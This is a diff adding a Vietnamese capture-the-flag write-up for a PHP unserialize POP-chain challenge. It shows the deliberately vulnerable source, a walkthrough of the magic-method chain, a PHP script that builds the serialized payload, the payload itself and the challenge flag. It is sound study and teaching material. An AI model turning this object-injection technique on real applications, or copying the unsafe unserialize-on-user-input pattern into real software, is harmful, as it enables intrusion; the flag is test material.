@@ -256,3 +256,175 @@ Bây giờ chỉ việc đọc file `.passwd`
 Kết quả:
 > .passwd: `561385a008727f860eda1afb7f8eba76`
 
+## PHP - Unserialize Pop Chain
+Bài cho source code:
+```
+    <?php
+     
+    $getflag = false;
+     
+    class GetMessage {
+        function __construct($receive) {
+            if ($receive === "HelloBooooooy") {
+                die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
+            } else {
+                $this->receive = $receive;
+            }
+        }
+     
+        function __toString() {
+            return $this->receive;
+        }
+     
+        function __destruct() {
+            global $getflag;
+            if ($this->receive !== "HelloBooooooy") {
+                die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
+            } else {
+                if ($getflag) {
+                    include("flag.php");
+                    echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
+                }
+            }
+        }
+    }
+     
+    class WakyWaky {
+        function __wakeup() {
+            echo "[YOU]: ".$this->msg."<br>";
+        }
+     
+        function __toString() {
+            global $getflag;
+            $getflag = true;
+            return (new GetMessage($this->msg))->receive;
+        }
+    }
+     
+    if (isset($_GET['source'])) {
+        highlight_file(__FILE__);
+        die();
+    }
+     
+    if (isset($_POST["data"]) && !empty($_POST["data"])) {
+        unserialize($_POST["data"]);
+    }
+     
+    ?>
+     
+    <!DOCTYPE html>
+    <html lang="en" dir="ltr">
+      <head>
+        <meta charset="UTF-8">
+        <title>PHP - Unserialize Pop Chain</title>
+      </head>
+      <body>
+        <h1>PHP - Unserialize Pop Chain</h1>
+        <hr>
+        <br>
+        <p>
+          Can you bypass the security your friend put in place to access the flag?
+        </p>
+        <br>
+        <form class="" action="index.php" method="post">
+          <textarea name="data" rows="5" cols="33" style="width:35%"></textarea>
+          <br>
+          <br>
+          <button type="submit" name="button" style="width:35%">Submit</button>
+        </form>
+        <br>
+        <p>
+          You can also <a href="?source">View the source</a>
+        </p>
+      </body>
+    </html>
+```
+Dựa vào đó ta biết được web sẽ nhận 1 POST data và unserialize nó.
+
+![image](https://user-images.githubusercontent.com/92881216/236405926-f7864d2a-de18-4f9e-aaa7-c0d0b53760db.png)
+
+Phân tích:
+
+Flag nằm trong đoạn code này:
+```
+function __destruct() {
+        global $getflag;
+        if ($this->receive !== "HelloBooooooy") {
+            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
+        } else {
+            if ($getflag) { 
+                include("flag.php");
+                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
+            }
+        }
+    }
+```
+Như vậy để lấy được flag cần:
+- `__destruct()` được thực thi: đây là magic method trong php sẽ được thực thi khi đối tượng được hủy hoặc chương trình kết thúc (không được thực thi khi chương trình kết thúc bỏi hàm `die()`)
+- Biến `$getflag` phải có giá trị là `true`
+- Giá trị `receive` của instance tại bởi class `GetMessage` là `HelloBooooooy` 
+
+Đầu tiên để `__destruct()` thực thi là tránh xuất hiện hàm `die()`. Ta thấy trong class `GetMessage` có:
+```
+function __construct($receive) {
+        if ($receive === "HelloBooooooy") {
+            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
+        } else {
+            $this->receive = $receive;
+        }
+    }
+```
+Đây là 1 magic method thực thi khi được khởi tạo đối tượng. Tuy nhiên nếu khởi tạo luôn là `$receive` có giá trị là `HelloBooooooy` sẽ bị false nên nó cần gán sau khi khởi tạo và method `__toString()` phải được thực thi.
+Ví dụ:
+
+Tiếp tục để biến `$getflag` có giá trị `true` ta thấy trong class `WakyWaky`:
+```
+function __toString() {
+        global $getflag;
+        $getflag = true;
+        return (new GetMessage($this->msg))->receive;
+    }
+```
+`__toString()` là 1 magic method được thực thi khi 1 đối tượng tạo bởi class đó được dùng như string. Ví dụ như: echo, print, preg_match(),...<br>
+Nhận thấy trong cùng class này có :
+```
+function __wakeup() {
+        echo "[YOU]: ".$this->msg."<br>";
+    }
+```
+Như vậy để `__toString()` thực thi thì `$this->msg` là đối tượng của class này (và cũng được gán với đối tượng của class phía trên vì cũng cần thực thi). Vậy để `__wakeup()` thực thi là được, đây cũng là 1 magic methed thực thi khi đối tượng được unserialize.
+
+Tóm lại script 
+```
+<?php
+$getflag = false;
+class GetMessage
+{
+    public $receive;
+}
+class WakyWaky
+{
+    public $msg;
+    function __construct($msg)
+    {
+        $this->msg = $msg;
+    }
+}
+$a = new GetMessage('');
+$a->receive = 'HelloBooooooy';
+
+$b1 = new WakyWaky($a);
+$b2 = new WakyWaky($b1);
+echo serialize($b2);
+```
+Được payload:
+```
+O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}
+```
+
+Kết quả
+
+![image](https://user-images.githubusercontent.com/92881216/236423263-f4eea55b-0328-41f2-95e1-988ba1c27d79.png)
+
+>flag: `uns3r14liz3_p0p_ch41n_r0cks`
+
